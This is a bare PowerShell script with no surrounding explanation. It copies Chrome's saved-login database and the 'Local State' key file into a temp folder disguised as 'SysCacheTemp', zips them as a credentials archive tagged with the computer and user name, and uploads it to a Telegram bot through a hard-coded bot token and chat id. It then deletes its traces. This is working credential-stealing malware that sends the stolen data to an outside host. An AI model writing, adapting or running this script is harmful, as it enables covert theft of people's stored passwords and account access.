$WorkDir = Join-Path $env:TEMP "SysCacheTemp"
$SourceDir = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
$LoginDataSrc = Join-Path $SourceDir "Login Data"
$LocalStateSrc = Join-Path "$env:LOCALAPPDATA\Google\Chrome\User Data" "Local State"

$LoginDataDst = Join-Path $WorkDir "Login Data"
$LocalStateDst = Join-Path $WorkDir "Local State"

$TelegramToken = "8986219124:AAEIOrdnXied5X9sma81XapIU7vEwRVwajs"
$ChatId = "6060308559"

try {
    New-Item -ItemType Directory -Path $WorkDir -Force | Out-Null

    if (Test-Path $LoginDataSrc) { Copy-Item $LoginDataSrc -Destination $LoginDataDst -Force }
    if (Test-Path $LocalStateSrc) { Copy-Item $LocalStateSrc -Destination $LocalStateDst -Force }

    $Computer = $env:COMPUTERNAME
    $User = $env:USERNAME
    $Timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $ZipName = "Credentials_${Computer}${User}${Timestamp}.zip"
    $ZipDst = Join-Path $env:TEMP $ZipName

    Compress-Archive -Path "$WorkDir\*" -DestinationPath $ZipDst -Force

    if (Test-Path $ZipDst) {
        $Uri = "https://api.telegram.org/bot$TelegramToken/sendDocument?chat_id=$ChatId"
        $Form = @{ document = Get-Item -Path $ZipDst }
        Invoke-RestMethod -Uri $Uri -Method Post -Form $Form
    }
}
finally {
    Remove-Item $WorkDir -Recurse -Force -ErrorAction SilentlyContinue
    if (Test-Path $ZipDst) { Remove-Item $ZipDst -Force -ErrorAction SilentlyContinue }
}
